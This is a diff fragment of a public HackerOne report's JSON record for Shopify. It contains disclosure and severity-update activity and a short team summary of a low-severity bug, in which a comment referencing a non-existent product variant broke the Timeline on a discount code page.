+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @abdulwahaab_ahmed I had just checked everything and it's looking good, so I confirm fully public disclosure.\nit had great to work on this with you.\n\nthanks",
+            "automated_response": false,
+            "created_at": "2019-07-09T23:18:51.550Z",
+            "updated_at": "2019-07-09T23:18:51.550Z",
+            "actor": {
+                "username": "modam3r5",
+                "cleared": false,
+                "verified": false,
+                "url": "/modam3r5",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/135/179/e17d4c24a0db7a92f9258af0e220deb09e175f34_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5323761,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-07-15T14:20:18.090Z",
+            "updated_at": "2019-07-15T14:20:18.090Z",
+            "actor": {
+                "username": "shopify-peteryaworski",
+                "cleared": false,
+                "verified": false,
+                "url": "/shopify-peteryaworski",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5323762,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-07-15T14:20:18.202Z",
+            "updated_at": "2019-07-15T14:20:18.202Z",
+            "actor": {
+                "username": "shopify-peteryaworski",
+                "cleared": false,
+                "verified": false,
+                "url": "/shopify-peteryaworski",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        },
+        {
+            "id": 5323765,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-07-15T14:20:51.882Z",
+            "updated_at": "2019-07-15T14:20:51.882Z",
+            "additional_data": {
+                "old_severity": null,
+                "new_severity": "Low",
+                "old_severity_id": null,
+                "new_severity_id": 459689
+            },
+            "actor": {
+                "username": "shopify-peteryaworski",
+                "cleared": false,
+                "verified": false,
+                "url": "/shopify-peteryaworski",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "shopify"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "id": 17105,
+            "category": "team",
+            "content": "@modam3r5 discovered an issue where an attacker could disable the Timeline section associated with a discount code by referencing a non-existent product variant in a comment, which resulted a exception being raised. The page for a discount would still render, except for the Timeline. The issue was fixed by rendering the Timeline properly regardless of the contents of user comments.\n\nUnfortunately this report wasn't eligible for a bounty because it was not one of our eligible vulnerability types. While we occasionally make exceptions for high-impact issues that fall outside our bounty table, the impact in this case is not sufficient to justify an exception.",
+            "user": {
+                "id": 166726,
+                "username": "abdulwahaab_ahmed",
+                "name": "Abdulwahaab Ahmed",
+                "bio": "",
+                "cleared": false,
+                "verified": false,
+                "website": null,
+                "location": "",
+                "created_at": "2017-05-11T17:57:27.993Z",
+                "url": "https://hackerone.com/abdulwahaab_ahmed",
+                "hackerone_triager": false,
+                "hackerone_employee": false,
+                "user_type": "company",
+                "profile_picture_urls": {
+                    "small": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+                    "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/166/726/fa53e0dd37718653edc8e2abea4724f3d0af03e9_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+                }
+            },
+            "can_view?": true,
+            "can_create?": false,
+            "attachments": []
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
